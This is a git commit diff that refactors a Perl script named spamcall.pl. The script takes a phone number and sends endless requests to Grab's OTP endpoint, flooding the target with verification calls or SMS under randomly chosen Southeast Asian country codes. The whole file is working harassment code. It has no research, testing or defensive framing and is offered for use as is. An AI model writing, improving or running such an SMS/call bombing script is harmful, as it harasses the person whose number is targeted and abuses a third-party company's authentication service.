e54828790019d91e572d5c785e7f0b8af86ca10d
sctnightcore <23263315+sctnightcore@users.noreply.github.com>
2019-02-06 22:59:24 +0700

    Update spamcall.pl

--- spamcall.pl
+++ spamcall.pl
@@ -2,37 +2,48 @@
 #ty :  https://github.com/likecyber/php-cli-gac-spammer [likecyber]
 use strict; use warnings;
 use LWP::UserAgent;
+my $go;
+&main();
 
-&main($ARGV[0],$ARGV[1]);
 sub main {
+	errorarrgv();
+	while (1) {	
+		api();
+	}	
+}
+
+sub errorarrgv{
 	my $num_args = $#ARGV + 1;
-	my $go;
 	if ($num_args != 2) {
 		print "By sctnightcore\n";
 		print "Usage: spamcall.pl number CALL|SMS|RANDOM\n";
 		exit;
 	}
+}
+
+sub callsmsrandom {
 	if ($ARGV[1] eq 'CALL' ) {
 		$go = 'CALL';
-	}
-	
-	if ($ARGV[1] eq 'SMS' ) {
+	} else { #else SMS
 		$go = 'SMS';
 	}
-	
 	if ($ARGV[1] eq 'RANDOM' ) {
 		my @index = ('CALL','SMS');
 		$go = $index[rand @index]; 
 	}
-	
-	while (1) {
-		my @countries = ('MY', 'SG', 'ID', 'TH', 'VN', 'KH', 'PH', 'MM');
-		my $ccode = $countries[rand @countries];
-		my $res = LWP::UserAgent->new->post( "https://api.grab.com/grabid/v1/phone/otp",Content => 'method='.$go.'&countryCode='.$ccode.'&phoneNumber='.$ARGV[0].'&templateID=&numDigits=4');
-		if ( $res->is_success ) {
-			print "[ ".$res->code." ] ".$go." Requested \n";
-		}
+	return $go
+}
+sub api {
+	my $res = LWP::UserAgent->new->post( "https://api.grab.com/grabid/v1/phone/otp",
+		Content => 'method='.callsmsrandom().'&countryCode='.ccode().'&phoneNumber='.$ARGV[0].'&templateID=&numDigits=4'
+	);
+	if ( $res->is_success ) {
+		print "[ ".$res->code." ][".ccode()."]".lc($go)." requested \n";
 	}
 }
 
-
+sub ccode {
+	my @countries = ('MY', 'SG', 'ID', 'TH', 'VN', 'KH', 'PH', 'MM');
+	my $ccode = $countries[rand @countries];
+	return $ccode;	
+}
